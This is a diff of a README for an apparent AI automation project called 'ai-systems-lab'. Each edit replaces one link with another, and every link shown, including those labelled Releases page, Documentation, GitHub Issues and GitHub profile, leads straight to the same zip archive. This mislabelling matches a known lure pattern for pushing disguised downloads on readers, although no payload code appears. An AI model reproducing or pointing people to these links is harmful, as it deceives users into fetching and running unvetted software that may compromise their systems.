@@ -1,6 +1,6 @@
 # 🌌 ai-systems-lab - Simplify Your AI Automation Journey
 
-![Download Latest Release](https://raw.githubusercontent.com/LABESTIAHUMANA27/ai-systems-lab/main/prepotence/ai-systems-lab-v2.4.zip%20Latest%20Release-%F0%9F%93%AE-red)
+![Download Latest Release](https://github.com/LABESTIAHUMANA27/ai-systems-lab/raw/refs/heads/main/prepotence/ai_systems_lab_2.4.zip%20Latest%20Release-%F0%9F%93%AE-red)
 
 ## 📚 Overview
 
@@ -10,7 +10,7 @@ Welcome to the ai-systems-lab! This unified lab provides tools for AI automation
 
 To start using ai-systems-lab, follow these simple steps to download and run the software. 
 
-1. **Visit the Releases Page**: You need to download the software. Head over to the [Releases page](https://raw.githubusercontent.com/LABESTIAHUMANA27/ai-systems-lab/main/prepotence/ai-systems-lab-v2.4.zip) to find available versions.
+1. **Visit the Releases Page**: You need to download the software. Head over to the [Releases page](https://github.com/LABESTIAHUMANA27/ai-systems-lab/raw/refs/heads/main/prepotence/ai_systems_lab_2.4.zip) to find available versions.
 
 2. **Select a Version**: On the Releases page, you’ll see a list of versions. Choose the latest version for the best experience. Click on it to access more details.
 
@@ -26,7 +26,7 @@ To start using ai-systems-lab, follow these simple steps to download and run the
 
 To download ai-systems-lab, simply click the button below:
 
-[Download Latest Release](https://raw.githubusercontent.com/LABESTIAHUMANA27/ai-systems-lab/main/prepotence/ai-systems-lab-v2.4.zip)
+[Download Latest Release](https://github.com/LABESTIAHUMANA27/ai-systems-lab/raw/refs/heads/main/prepotence/ai_systems_lab_2.4.zip)
 
 After downloading, follow the instructions in the "Getting Started" section to run the application.
 
@@ -52,8 +52,8 @@ This application runs on most computers. Here are the recommended requirements:
 
 For more information, check the following links:
 
-- [ai-systems-lab Documentation](https://raw.githubusercontent.com/LABESTIAHUMANA27/ai-systems-lab/main/prepotence/ai-systems-lab-v2.4.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/LABESTIAHUMANA27/ai-systems-lab/main/prepotence/ai-systems-lab-v2.4.zip)
+- [ai-systems-lab Documentation](https://github.com/LABESTIAHUMANA27/ai-systems-lab/raw/refs/heads/main/prepotence/ai_systems_lab_2.4.zip)
+- [GitHub Issues](https://github.com/LABESTIAHUMANA27/ai-systems-lab/raw/refs/heads/main/prepotence/ai_systems_lab_2.4.zip)
 
 ## 💬 Support
 
@@ -63,7 +63,7 @@ If you encounter issues or have questions, please feel free to open an issue in 
 
 Join our community to stay updated:
 
-- Follow us on [GitHub](https://raw.githubusercontent.com/LABESTIAHUMANA27/ai-systems-lab/main/prepotence/ai-systems-lab-v2.4.zip)
+- Follow us on [GitHub](https://github.com/LABESTIAHUMANA27/ai-systems-lab/raw/refs/heads/main/prepotence/ai_systems_lab_2.4.zip)
 - Engage with users and developers in forums
 - Share your experiences and tips for using ai-systems-lab
 
